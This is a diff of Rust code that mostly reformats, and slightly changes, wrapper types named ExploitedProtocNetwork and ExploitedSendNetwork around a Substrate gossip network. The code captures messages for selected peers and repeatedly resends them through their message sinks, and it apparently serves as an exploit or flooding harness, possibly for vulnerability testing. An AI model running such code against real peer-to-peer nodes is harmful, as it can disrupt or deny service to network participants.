@@ -1,5 +1,8 @@
 use std::{
-    borrow::{Borrow, BorrowMut}, collections::{HashMap, HashSet}, fmt::{Debug, Display, Error as FmtError, Formatter}, sync::Arc
+    borrow::{Borrow, BorrowMut},
+    collections::{HashMap, HashSet},
+    fmt::{Debug, Display, Error as FmtError, Formatter},
+    sync::Arc,
 };
 
 use futures::{channel::mpsc, Future, StreamExt};
@@ -8,7 +11,8 @@ use parity_scale_codec::DecodeAll;
 use rand::{seq::IteratorRandom, thread_rng};
 pub use sc_network::PeerId;
 use sc_network::{
-    service::traits::{NotificationEvent as SubstrateEvent, ValidationResult}, MessageSink, ProtocolName
+    service::traits::{NotificationEvent as SubstrateEvent, ValidationResult},
+    MessageSink, ProtocolName,
 };
 use tokio::time;
 
@@ -23,31 +27,47 @@ pub struct ExploitedProtocNetwork<Exploit = ()> {
 }
 
 impl ExploitedProtocNetwork {
-    pub fn new(protocol_network: ProtocolNetwork, mut peer_filter: impl FnMut(&PeerId) -> bool + Send + 'static) -> (ExploitedProtocNetwork<impl FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static>, impl Future<Output = Result<(), ()>>) {
+    pub fn new(
+        protocol_network: ProtocolNetwork,
+        mut peer_filter: impl FnMut(&PeerId) -> bool + Send + 'static,
+    ) -> (
+        ExploitedProtocNetwork<impl FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static>,
+        impl Future<Output = Result<(), ()>>,
+    ) {
         let (mut exploit_sender, exploit_receiver) = mpsc::channel(0);
         let mut filtered_peers = HashMap::new();
-        let network = ExploitedProtocNetwork { protocol_network, exploit: move |data, peer_id, protocol_network: &mut ProtocolNetwork| {
-            if !peer_filter(&peer_id) {
-                filtered_peers.remove(&peer_id);
-                return;
-            }
-            let message_sink = match filtered_peers.entry(peer_id) {
-                std::collections::hash_map::Entry::Vacant(vacant) => {
-                    let network_service: &Box<dyn sc_network::config::NotificationService> = protocol_network.borrow_mut();
-                    let Some(message_sink) = network_service.message_sink(&peer_id) else { return };
-                    vacant.insert(Arc::new(message_sink)).clone()
-                },
-                std::collections::hash_map::Entry::Occupied(message_sink) => message_sink.get().clone(),
-            };
-            exploit_sender.try_send((data, peer_id, message_sink));
-        }};
+        let network = ExploitedProtocNetwork {
+            protocol_network,
+            exploit: move |data, peer_id, protocol_network: &mut ProtocolNetwork| {
+                if !peer_filter(&peer_id) {
+                    filtered_peers.remove(&peer_id);
+                    return;
+                }
+                let message_sink = match filtered_peers.entry(peer_id) {
+                    std::collections::hash_map::Entry::Vacant(vacant) => {
+                        let network_service: &Box<dyn sc_network::config::NotificationService> =
+                            protocol_network.borrow_mut();
+                        let Some(message_sink) = network_service.message_sink(&peer_id) else {
+                            return;
+                        };
+                        vacant.insert(Arc::new(message_sink)).clone()
+                    }
+                    std::collections::hash_map::Entry::Occupied(message_sink) => {
+                        message_sink.get().clone()
+                    }
+                };
+                exploit_sender.try_send((data, peer_id, message_sink));
+            },
+        };
         let exploit = ExploitedSendNetwork::new(exploit_receiver).run();
         (network, exploit)
     }
 }
 
 #[async_trait::async_trait]
-impl<Exploit: FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static, D: Data> GossipNetwork<D> for ExploitedProtocNetwork<Exploit> {
+impl<Exploit: FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static, D: Data>
+    GossipNetwork<D> for ExploitedProtocNetwork<Exploit>
+{
     type Error = <ProtocolNetwork as GossipNetwork<D>>::Error;
     type PeerId = <ProtocolNetwork as GossipNetwork<D>>::PeerId;
 
@@ -56,11 +76,15 @@ impl<Exploit: FnMut(Vec<u8>, PeerId, &mut ProtocolNetwork) + Send + 'static, D: 
         self.protocol_network.send_to(data, peer_id)
     }
 
-    fn send_to_random(&mut self, data: D, peer_ids: HashSet<Self::PeerId>) -> Result<(), Self::Error>  {
+    fn send_to_random(
+        &mut self,
+        data: D,
+        peer_ids: HashSet<Self::PeerId>,
+    ) -> Result<(), Self::Error> {
         self.protocol_network.send_to_random(data, peer_ids)
     }
 
-    fn broadcast(&mut self, data: D) -> Result<(), Self::Error>  {
+    fn broadcast(&mut self, data: D) -> Result<(), Self::Error> {
         self.protocol_network.broadcast(data)
     }
 
@@ -164,22 +188,32 @@ pub struct ExploitedSendNetwork {
 }
 
 impl ExploitedSendNetwork {
-    pub fn new(receiver: futures::channel::mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>) -> Self {
+    pub fn new(
+        receiver: futures::channel::mpsc::Receiver<(Vec<u8>, PeerId, Arc<Box<dyn MessageSink>>)>,
+    ) -> Self {
         Self { data: receiver }
     }
 }
 
 impl ExploitedSendNetwork {
     pub async fn run(mut self) -> Result<(), ()> {
-        let (mut message, mut peer_id, mut sink) = self.data.next().await.ok_or_else(|| panic!("where data?!"))?;
+        let (mut message, _, mut sink) = self
+            .data
+            .next()
+            .await
+            .ok_or_else(|| panic!("where data?!"))?;
         loop {
-            sink.send_sync_notification(message.clone());
-            if let Some(new_message) = self.data.try_next().map_err(|_| panic!("yyyy koniec"))? {
-                if new_message.1 != peer_id {
-                    continue;
-                }
-                (message, peer_id, sink) = new_message;
+            // sink.send_sync_notification(message.clone());
+            let send_result = sink.send_async_notification(message.clone()).await;
+            if let Err(err) = send_result {
+                println!("error while sending exploit: {err}");
             }
+            let new_message = match self.data.try_next() {
+                Ok(Some(new_message)) => new_message,
+                Ok(None) => panic!("yyyy koniec"),
+                Err(_) => continue,
+            };
+            (message, _, sink) = new_message;
         }
     }
 }
@@ -193,15 +227,19 @@ pub struct ExploitedNetwork<N, F> {
     exploit: F,
 }
 
-impl<N, F> ExploitedNetwork<N, F>
-{
+impl<N, F> ExploitedNetwork<N, F> {
     pub fn new(network: N, exploit: F) -> Self {
-        Self { inner: network, exploit }
+        Self {
+            inner: network,
+            exploit,
+        }
     }
 }
 
 #[async_trait::async_trait]
-impl<D: Data, N: GossipNetwork<D>, F: FnMut(Vec<u8>, N::PeerId) + Send + 'static> GossipNetwork<D> for ExploitedNetwork<N, F> {
+impl<D: Data, N: GossipNetwork<D>, F: FnMut(Vec<u8>, N::PeerId) + Send + 'static> GossipNetwork<D>
+    for ExploitedNetwork<N, F>
+{
     type Error = N::Error;
     type PeerId = N::PeerId;
 
@@ -210,7 +248,11 @@ impl<D: Data, N: GossipNetwork<D>, F: FnMut(Vec<u8>, N::PeerId) + Send + 'static
         self.inner.send_to(data, peer_id)
     }
 
-    fn send_to_random(&mut self, data: D, peer_ids: HashSet<Self::PeerId>) -> Result<(), Self::Error> {
+    fn send_to_random(
+        &mut self,
+        data: D,
+        peer_ids: HashSet<Self::PeerId>,
+    ) -> Result<(), Self::Error> {
         self.inner.send_to_random(data, peer_ids)
     }
 
